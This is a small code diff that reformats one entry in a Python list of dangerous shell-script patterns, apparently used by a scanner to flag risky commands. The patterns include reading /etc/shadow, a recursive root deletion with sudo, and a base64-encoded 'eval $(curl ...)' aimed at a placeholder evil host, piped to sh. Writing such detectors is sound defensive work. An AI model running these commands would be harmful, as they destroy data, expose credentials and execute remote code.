@@ -161,7 +161,10 @@ DANGEROUS_SCRIPT_PATTERNS = [
     ("cat /etc/shadow", "Access to shadow file"),
     ("chmod 777 /etc", "Overly permissive permissions"),
     ("sudo rm -rf /", "Sudo with dangerous command"),
-    ("base64 -d <<< 'ZXZhbCAkKGN1cmwgaHR0cDovL2V2aWwuY29tKQ==' | sh", "Encoded execution"),
+    (
+        "base64 -d <<< 'ZXZhbCAkKGN1cmwgaHR0cDovL2V2aWwuY29tKQ==' | sh",
+        "Encoded execution",
+    ),
 ]
 
 
